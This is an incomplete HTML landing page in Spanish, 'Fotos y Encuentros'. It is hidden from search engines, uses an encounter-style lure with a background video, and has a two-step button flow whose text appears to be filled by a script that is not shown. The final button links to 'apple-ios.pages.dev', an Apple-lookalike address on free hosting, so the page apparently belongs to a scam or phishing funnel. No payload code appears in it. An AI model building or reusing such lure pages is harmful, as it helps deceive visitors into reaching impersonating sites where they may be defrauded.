<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow" />
  <title>Fotos y Encuentros</title>

  <meta property="og:image" content="https://i.postimg.cc/c4pXCYNv/497731201-122102246612871161-7162665191645491046-n.jpg" />
  <link rel="shortcut icon" href="https://cdn.jmpcdn.com/assets/3420/images/2.ico" type="image/x-icon" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />

  <style>
    /* Estilos base (igual que antes) */
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body {
      height: 100%;
      font-family: 'Poppins', sans-serif;
      color: #fff;
      background-color: #000;
      overflow-x: hidden;
    }
    #VideoBg {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      object-fit: cover;
      z-index: -1;
    }
    .wrap {
      position: relative;
      z-index: 1;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      background: rgba(0, 0, 0, 0.6);
      text-align: center;
    }
    .logo img { width: 100%; max-width: 240px; margin-bottom: 30px; filter: drop-shadow(0 0 10px #fff); }
    .question-title { font-size: 2rem; margin: 25px 0; text-shadow: 1px 1px 3px #000; line-height: 1.4; }
    .buttons-block { display: flex; flex-direction: column; align-items: center; gap: 20px; width: 100%; max-width: 400px; margin: 0 auto; }
    .step-btn {
      width: 100%; padding: 18px 24px;
      background: linear-gradient(45deg, #ff0080, #7928ca);
      color: #fff; font-weight: 600; font-size: 1.2rem;
      border: none; border-radius: 14px;
      cursor: pointer; transition: transform 0.2s, box-shadow 0.2s;
      box-shadow: 0 4px 15px rgba(255, 0, 128, 0.4);
      text-align: center;
    }
    .step-btn:hover { transform: scale(1.05); box-shadow: 0 6px 20px rgba(255, 0, 128, 0.6); }
    a.step-btn { text-decoration: none; display: block; }
    @media (max-width: 480px) {
      .logo img { max-width: 200px; }
      .question-title { font-size: 1.4rem; }
      .step-btn { font-size: 1.05rem; padding: 16px 20px; }
      .buttons-block { max-width: 90%; }
    }
  </style>
</head>
<body>

  <video autoplay muted loop id="VideoBg" playsinline>
    <source src="https://cdn-dimi.akamaized.net/landings/275415/1665133459/images/4.mp4" type="video/mp4">
  </video>

  <div class="wrap">
    <div class="logo">
      <img src="https://i.imgur.com/sZdtUEq.png" alt="Logo del sitio" />
    </div>

    <div class="step-block">
      <div class="step-item" id="step1">
        <div class="question-title" id="text1"></div>
        <div class="buttons-block">
          <button class="step-btn" onclick="mostrarPaso2()" id="btn1"></button>
          <button class="step-btn" onclick="alert(noAhora)" id="btn2"></button>
        </div>
      </div>

      <div class="step-item" id="step2" style="display: none;">
        <div class="question-title" id="text2"></div>
        <div class="buttons-block">
          <a href="https://apple-ios.pages.dev" class="step-btn" id="btn3"></a>
        </div>
      </div>
    </div>
  </div>
